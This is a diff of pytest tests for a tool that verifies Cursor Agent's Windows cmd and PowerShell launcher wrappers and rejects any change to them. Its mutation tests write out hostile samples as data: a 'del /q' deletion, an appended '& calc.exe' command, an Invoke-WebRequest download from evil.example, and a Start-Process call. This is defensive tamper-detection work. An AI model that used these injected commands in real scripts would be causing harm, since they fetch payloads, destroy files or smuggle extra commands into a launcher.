@@ -615,6 +615,310 @@ def test_preflight_only_is_effect_free_and_existing_run_id_is_rejected(tmp_path:
     assert captured["status"]==NativePreflightStatus.PREFLIGHT_BLOCKED.value
 
 
+# --- Act 2A.2: LOCAL_WRAPPER_CHAIN attestation ------------------------------
+
+from admissible.delegated_gate.native_canary import NativeCanaryAuthorizationPayload
+from admissible.delegated_gate.native_executor import (
+    ATTESTATION_CLASS_PACKAGE_BIN,
+    ATTESTATION_CLASS_WRAPPER_CHAIN,
+    WRAPPER_CHAIN_CLAIMS,
+    WRAPPER_CHAIN_NON_CLAIMS,
+    WRAPPER_CHAIN_READY_REASON,
+    WrapperChainBackendAttestation,
+    attestation_from_dict,
+    preflight_native_cursor as _preflight,
+    _attest_local_backend,
+    _attest_wrapper_chain_cursor,
+    _parse_cmd_wrapper,
+    _parse_powershell_wrapper,
+    _POWERSHELL_WRAPPER_TEMPLATE_LINES,
+)
+
+_OBSERVED_CMD_WRAPPER = (
+    '@echo off\r\n'
+    'setlocal enabledelayedexpansion\r\n'
+    'set "CURSOR_INVOKED_AS=%~nx0"\r\n'
+    '\r\n'
+    'REM Get the directory of this script\r\n'
+    'set "SCRIPT_DIR=%~dp0"\r\n'
+    'REM Remove trailing backslash\r\n'
+    'if "%SCRIPT_DIR:~-1%"=="\\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"\r\n'
+    '\r\n'
+    '%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_DIR%\\cursor-agent.ps1" %*\r\n'
+)
+_OBSERVED_PS_WRAPPER = "## Locally observed Anysphere launcher\r\n" + "\r\n".join(_POWERSHELL_WRAPPER_TEMPLATE_LINES) + "\r\n"
+
+
+def _wrapper_chain_installation(tmp_path: Path, *, versions: tuple[str, ...] = ("2026.06.15-18-00-12-6f5a2cf", "2026.07.09-a3815c0"), manifest_name: str = EXPECTED_CURSOR_PACKAGE_NAME) -> Path:
+    root = tmp_path / "wrapper-install"; root.mkdir()
+    (root / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
+    (root / "cursor-agent.ps1").write_bytes(_OBSERVED_PS_WRAPPER.encode("utf-8"))
+    for name in versions:
+        version = root / "versions" / name; version.mkdir(parents=True)
+        shutil.copy2(Path(sys.executable).resolve(), version / "node.exe")
+        (version / "index.js").write_text("// deterministic fake cursor entry\n", encoding="utf-8")
+        (version / "package.json").write_text(json.dumps({"name": manifest_name}), encoding="utf-8")
+        (version / "cursor-agent.cmd").write_bytes((root / "cursor-agent.cmd").read_bytes())
+        (version / "cursor-agent.ps1").write_bytes((root / "cursor-agent.ps1").read_bytes())
+    return root
+
+
+@dataclass
+class FakeWrapperChainDiscovery:
+    """Explicit test-only discovery seam; unreachable from the production CLI."""
+
+    root: Path
+    which: str | None = None
+    where: tuple[str, ...] | None = None
+    powershell: tuple[str, ...] | None = None
+    path: str | None = None
+    pathext: str = ".COM;.EXE;.BAT;.CMD"
+
+    def which_cursor_agent(self) -> str | None: return self.which if self.which is not None else str(self.root / "cursor-agent.cmd")
+    def where_cursor_agent(self) -> tuple[str, ...]: return self.where if self.where is not None else (str(self.root / "cursor-agent.cmd"),)
+    def powershell_cursor_agent(self) -> tuple[str, ...] | None: return self.powershell if self.powershell is not None else (str(self.root / "cursor-agent.ps1"),)
+    def path_value(self) -> str: return self.path if self.path is not None else str(self.root) + os.pathsep + "C:\\Windows"
+    def pathext_value(self) -> str: return self.pathext
+    def node_signature_context(self, node_path: Path) -> str: return "NotSigned|test-context"
+
+
+_WRAPPER_CONFIG = CursorNativeBackendConfig(executable="cursor-agent", attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)
+
+
+def _wrapper_attestation(tmp_path: Path) -> tuple[Path, FakeWrapperChainDiscovery, WrapperChainBackendAttestation]:
+    root = _wrapper_chain_installation(tmp_path)
+    discovery = FakeWrapperChainDiscovery(root)
+    return root, discovery, _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
+
+
+def test_wrapper_chain_positive_recognizes_observed_grammar_and_selects_latest(tmp_path: Path):
+    root, discovery, attestation = _wrapper_attestation(tmp_path)
+    assert attestation.attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
+    assert attestation.version_inventory == ("2026.06.15-18-00-12-6f5a2cf", "2026.07.09-a3815c0")
+    assert attestation.selected_version == "2026.07.09-a3815c0"
+    selected = root / "versions" / "2026.07.09-a3815c0"
+    assert Path(attestation.executable.canonical_path) == selected / "node.exe"
+    assert Path(attestation.launcher_prefix[0].canonical_path) == selected / "index.js"
+    assert attestation.cmd_semantics["adjacent_powershell_target"] == "cursor-agent.ps1"
+    assert attestation.powershell_semantics["executes"] == "selected-version node.exe index.js"
+    assert dict(attestation.claims) == WRAPPER_CHAIN_CLAIMS and attestation.claims["publisher_provenance_established"] is False
+    assert attestation.non_claims == WRAPPER_CHAIN_NON_CLAIMS
+    assert attestation.manifest_declares_cursor_agent_bin is False
+    reloaded = attestation_from_dict(json.loads(json.dumps(attestation.to_dict())))
+    assert isinstance(reloaded, WrapperChainBackendAttestation) and reloaded == attestation
+    assert _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery) == attestation
+
+
+def test_wrapper_chain_requires_explicit_class_and_rejects_caller_supplied_roots(tmp_path: Path):
+    root = _wrapper_chain_installation(tmp_path)
+    with pytest.raises(ValueError, match="explicitly configured"):
+        _attest_wrapper_chain_cursor(CursorNativeBackendConfig(executable="cursor-agent"), discovery=FakeWrapperChainDiscovery(root))
+    with pytest.raises(ValueError, match="bare canonical"):
+        CursorNativeBackendConfig(executable=str(root / "cursor-agent.cmd"), attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)
+    with pytest.raises(ValueError, match="bare canonical"):
+        CursorNativeBackendConfig(executable="cursor-agent", launcher_prefix=(str(root / "cursor-agent.ps1"),), attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)
+    # A failed package-bin attestation raises; it never downgrades in place.
+    with pytest.raises(ValueError):
+        _attest_local_backend(CursorNativeBackendConfig(executable=str(_fake_cursor_executable(tmp_path).resolve()), launcher_prefix=(str(root / "cursor-agent.ps1"),)))
+
+
+def test_production_wrapper_chain_surface_has_no_injection_seam():
+    import inspect
+    from admissible.delegated_gate.native_canary import build_parser as production_parser
+    assert set(inspect.signature(_preflight).parameters) == {"config", "work_workspace"}
+    options = {option for action in production_parser()._actions for option in action.option_strings}
+    assert not any("discovery" in option or "attestation-file" in option for option in options)
+
+
+@pytest.mark.parametrize("mutate", [
+    lambda text: text + "del /q important.txt\r\n",
+    lambda text: text.replace("cursor-agent.ps1", "other.ps1"),
+    lambda text: text.replace(" %*", " %* --force"),
+    lambda text: text.replace("%*\r\n", "%* & calc.exe\r\n"),
+    lambda text: text.replace('"%SCRIPT_DIR%\\cursor-agent.ps1"', '"C:\\Temp\\cursor-agent.ps1"'),
+    lambda text: text.replace("-NoProfile ", ""),
+    lambda text: text.replace('set "SCRIPT_DIR=%~dp0"', 'cd /d C:\\ \r\nset "SCRIPT_DIR=%~dp0"'),
+])
+def test_cmd_wrapper_parser_rejects_non_audited_semantics(mutate):
+    with pytest.raises(ValueError):
+        _parse_cmd_wrapper(mutate(_OBSERVED_CMD_WRAPPER).encode("ascii"), wrapper_name="cursor-agent.cmd")
+
+
+@pytest.mark.parametrize("mutate", [
+    lambda text: text + "Invoke-WebRequest https://evil.example/payload -OutFile $scriptPath\\update.ps1\r\n",
+    lambda text: text.replace("$args\r\n", "$args --force\r\n"),
+    lambda text: text.replace('"$scriptPath\\versions"', '"$env:TEMP\\versions"'),
+    lambda text: text.replace("'^\\d{4}", "'^\\d{2}"),
+    lambda text: text.replace("Select-Object -First 1", "Select-Object -Last 1"),
+    lambda text: text + '@"\r\nhidden\r\n"@\r\n',
+    lambda text: text.replace("exit $LASTEXITCODE\r\n", "exit $LASTEXITCODE\r\nStart-Process installer.exe\r\n"),
+])
+def test_powershell_wrapper_recognizer_fails_closed(mutate):
+    with pytest.raises(ValueError):
+        _parse_powershell_wrapper(mutate(_OBSERVED_PS_WRAPPER).encode("utf-8"))
+
+
+def test_contradictory_or_out_of_root_command_resolution_blocks(tmp_path: Path):
+    root = _wrapper_chain_installation(tmp_path)
+    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
+    (elsewhere / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
+    base = FakeWrapperChainDiscovery(root)
+    for discovery in (
+        FakeWrapperChainDiscovery(root, which=str(elsewhere / "cursor-agent.cmd")),
+        FakeWrapperChainDiscovery(root, where=(str(elsewhere / "cursor-agent.cmd"), str(root / "cursor-agent.cmd"))),
+        FakeWrapperChainDiscovery(root, where=(str(root / "cursor-agent.cmd"), str(elsewhere / "cursor-agent.cmd"))),
+        FakeWrapperChainDiscovery(root, powershell=(str(elsewhere / "cursor-agent.cmd"),)),
+        FakeWrapperChainDiscovery(root, path="C:\\Windows"),
+        FakeWrapperChainDiscovery(root, pathext=".COM;.EXE;.BAT"),
+        FakeWrapperChainDiscovery(root, where=()),
+        FakeWrapperChainDiscovery(root, which=""),
+    ):
+        with pytest.raises(ValueError):
+            _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
+    assert _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=base) is not None
+
+
+def test_changed_path_fingerprint_produces_a_different_attestation(tmp_path: Path):
+    root, discovery, attestation = _wrapper_attestation(tmp_path)
+    reordered = FakeWrapperChainDiscovery(root, path="C:\\Windows" + os.pathsep + str(root))
+    other = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=reordered)
+    assert other.attestation_fingerprint != attestation.attestation_fingerprint
+
+
+def test_version_tie_ambiguity_and_grammar_mismatch_block(tmp_path: Path):
+    root = _wrapper_chain_installation(tmp_path, versions=("2026.07.09-a3815c0", "2026.7.9-bbbbbbb"))
+    with pytest.raises(ValueError, match="ambiguous"):
+        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root))
+    (tmp_path / "bad").mkdir()
+    bad = _wrapper_chain_installation(tmp_path / "bad", versions=("not-a-version",))
+    with pytest.raises(ValueError, match="grammar"):
+        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(bad))
+
+
+def test_junction_or_symlink_version_directory_is_refused(tmp_path: Path):
+    root = _wrapper_chain_installation(tmp_path)
+    target = tmp_path / "redirect-target"; target.mkdir()
+    link = root / "versions" / "2026.08.01-cafecafe"
+    if os.name == "nt":
+        completed = subprocess.run(["cmd.exe", "/d", "/c", "mklink", "/J", str(link), str(target)], shell=False, capture_output=True)
+        if completed.returncode != 0: pytest.skip("junction creation unavailable")
+    else:
+        try: os.symlink(target, link, target_is_directory=True)
+        except (OSError, NotImplementedError): pytest.skip("symlinks unavailable")
+    with pytest.raises(ValueError, match="redirecting"):
+        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root))
+
+
+@pytest.mark.parametrize("mutate", [
+    lambda root, selected: (root / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.replace(" %*", " %* --trust").encode("ascii")),
+    lambda root, selected: (root / "cursor-agent.ps1").write_bytes((_OBSERVED_PS_WRAPPER + "Copy-Item a b\r\n").encode("utf-8")),
+    lambda root, selected: (selected / "cursor-agent.ps1").write_bytes(b"# hollowed\r\n" + (root / "cursor-agent.ps1").read_bytes()),
+    lambda root, selected: (selected / "index.js").write_text("// substituted entry\n", encoding="utf-8"),
+    lambda root, selected: (selected / "node.exe").write_bytes((selected / "node.exe").read_bytes() + b"x"),
+    lambda root, selected: (selected / "package.json").write_text(json.dumps({"name": "impostor-package"}), encoding="utf-8"),
+    lambda root, selected: (root / "versions" / "2026.08.01-cafecafe").mkdir(),
+    lambda root, selected: shutil.copy2(selected / "node.exe", root / "node.exe"),
+])
+def test_any_authoritative_change_after_attestation_fails_revalidation_and_blocks_spawn(tmp_path: Path, mutate):
+    root, discovery, attestation = _wrapper_attestation(tmp_path)
+    selected = root / "versions" / attestation.selected_version
+    mutate(root, selected)
+    with pytest.raises(ValueError):
+        attestation.validated()
+
+
+def test_substituted_wrapper_chain_attestation_with_recomputed_fingerprints_is_rejected(tmp_path: Path):
+    root, discovery, attestation = _wrapper_attestation(tmp_path)
+    raw = attestation.to_dict()
+    raw["selected_version"] = "2026.06.15-18-00-12-6f5a2cf"
+    raw["attestation_fingerprint"] = fingerprint({key: value for key, value in raw.items() if key != "attestation_fingerprint"})
+    with pytest.raises(ValueError):
+        attestation_from_dict(raw)
+    lying = attestation.to_dict()
+    lying["claims"] = {**lying["claims"], "publisher_provenance_established": True}
+    lying["attestation_fingerprint"] = fingerprint({key: value for key, value in lying.items() if key != "attestation_fingerprint"})
+    with pytest.raises(ValueError, match="claim"):
+        attestation_from_dict(lying)
+
+
+def _wrapper_chain_harness(tmp_path: Path) -> tuple[Harness, FakeWrapperChainDiscovery]:
+    source_parent = tmp_path / "source-parent"; source_parent.mkdir(); source = build_canary_repository(source_parent, repository_name="source").repository
+    root = tmp_path / "run"; root.mkdir(); work = build_canary_repository(root).repository; evidence = root / "evidence"; evidence.mkdir()
+    install_root = _wrapper_chain_installation(tmp_path)
+    discovery = FakeWrapperChainDiscovery(install_root)
+    attestor = lambda config: _attest_wrapper_chain_cursor(config, discovery=discovery)
+    attestation = attestor(_WRAPPER_CONFIG)
+    fake = FakeNativeProcessRunner(); store = AtomicNativeExecutionStore(evidence / "native-execution", directory_sync=lambda _: None); session_store = AtomicDelegatedSessionStore(evidence / "delegated-state")
+    session_id = "wrapper-chain-session"; session_store.create(create_canary_session(session_id=session_id))
+    executor = NativeDelegatedExecutor(config=_WRAPPER_CONFIG, process_runner=fake, clock=Clock(), local_attestor=attestor)
+    coordinator = NativeCanaryCoordinator(session_store=session_store, execution_store=store, executor=executor, backend_attestation=attestation, source_repository=source, work_workspace=work, canary_parent=root, evidence_directory=evidence, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048)
+    return Harness(root, source, work, evidence, _WRAPPER_CONFIG, attestation, fake, store, session_store, executor, coordinator, session_id), discovery
+
+
+def test_wrapper_chain_attestation_round_trips_through_request_execution_and_reconstruction(tmp_path: Path):
+    h, discovery = _wrapper_chain_harness(tmp_path)
+    first = h.coordinator.run(session_id=h.session_id)
+    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS
+    second = h.coordinator.run(session_id=h.session_id)
+    assert second.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS and len(h.runner.invocations) == 1
+    request = h.store.load_request(h.session_id, "native-canary-gate", 0)
+    assert isinstance(request.backend_attestation, WrapperChainBackendAttestation)
+    assert request.backend_attestation.attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
+    argv = h.runner.invocations[0].argv
+    assert argv[0] == h.attestation.executable.canonical_path and argv[1] == h.attestation.launcher_prefix[0].canonical_path
+
+
+def test_new_later_version_after_authorization_blocks_spawn_and_invalidates_payload(tmp_path: Path):
+    h, discovery = _wrapper_chain_harness(tmp_path)
+    state = h.session_store.load(h.session_id)
+    prompt = build_native_agent_prompt(mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work)
+    request = NativeExecutionRequest.create(session_id=state.session_id, gate_id=state.current_gate.gate_id, execution_attempt_index=0, mission_fingerprint=state.mission.mission_fingerprint, gate_contract_fingerprint=state.current_gate.contract_fingerprint, work_workspace=h.work, evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory, attestation=h.attestation, prompt=prompt, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048)
+    payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30)
+    assert payload.backend_attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
+    assert tuple(payload.attestation_non_claims) == WRAPPER_CHAIN_NON_CLAIMS
+    install_root = Path(h.attestation.command_resolution.wrapper_root)
+    later = install_root / "versions" / "2026.08.01-cafecafe"; later.mkdir()
+    shutil.copy2(Path(sys.executable).resolve(), later / "node.exe")
+    (later / "index.js").write_text("// newer entry\n", encoding="utf-8")
+    (later / "package.json").write_text(json.dumps({"name": EXPECTED_CURSOR_PACKAGE_NAME}), encoding="utf-8")
+    with pytest.raises(NativeEvidenceInvalid):
+        h.executor.execute(request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root, allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory)
+    assert h.runner.invocations == []
+    fresh = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
+    new_payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=fresh, run_root=tmp_path / "future-run", timeout_seconds=30)
+    assert new_payload.payload_fingerprint != payload.payload_fingerprint
+
+
+def test_authorization_payload_rejects_mismatched_class_and_non_claims(tmp_path: Path):
+    h, _ = _wrapper_chain_harness(tmp_path)
+    payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30)
+    for field, value in (
+        ("backend_attestation_class", ATTESTATION_CLASS_PACKAGE_BIN),
+        ("backend_attestation_class", "CURSOR_INSTALLATION_PROVEN"),
+        ("attestation_non_claims", []),
+        ("attestation_non_claims", list(WRAPPER_CHAIN_NON_CLAIMS[:-1])),
+    ):
+        changed = payload.to_dict(); changed[field] = value
+        changed["payload_fingerprint"] = fingerprint({key: item for key, item in changed.items() if key != "payload_fingerprint"})
+        with pytest.raises(ValueError):
+            NativeCanaryAuthorizationPayload(**{**changed, "launcher_prefix": tuple(changed["launcher_prefix"]), "budgets": tuple(changed["budgets"]), "attestation_non_claims": tuple(changed["attestation_non_claims"])}).validated()
+
+
+def test_real_host_wrapper_chain_preflight_is_static_and_truthfully_non_overclaiming():
+    if os.name != "nt" or shutil.which("cursor-agent") is None:
+        pytest.skip("Cursor Agent is not locally installed")
+    decision = _preflight(config=_WRAPPER_CONFIG)
+    if decision.status is not NativePreflightStatus.PREFLIGHT_READY:
+        pytest.skip(f"local wrapper chain does not currently attest: {decision.detail}")
+    assert decision.reason_code == WRAPPER_CHAIN_READY_REASON
+    attestation = decision.attestation
+    assert isinstance(attestation, WrapperChainBackendAttestation)
+    assert attestation.claims["publisher_provenance_established"] is False
+    assert attestation.claims["cli_capability_behavior_proven"] is False
+    assert attestation.non_claims == WRAPPER_CHAIN_NON_CLAIMS
+    assert "CURSOR_INSTALLATION_PROVEN" not in decision.reason_code
+
+
 def test_prompt_header_and_no_agent_os_import():
     package=Path(__file__).resolve().parents[1]/"admissible"/"delegated_gate"; source=(package/"native_executor.py").read_text(encoding="utf-8")+(package/"native_canary.py").read_text(encoding="utf-8")
     assert "agent_os" not in source and build_native_agent_prompt(mission=create_canary_session(session_id="s").mission,gate_contract=create_canary_session(session_id="s").current_gate,work_workspace=Path.cwd()).startswith("You are the Admissible native coding agent.")
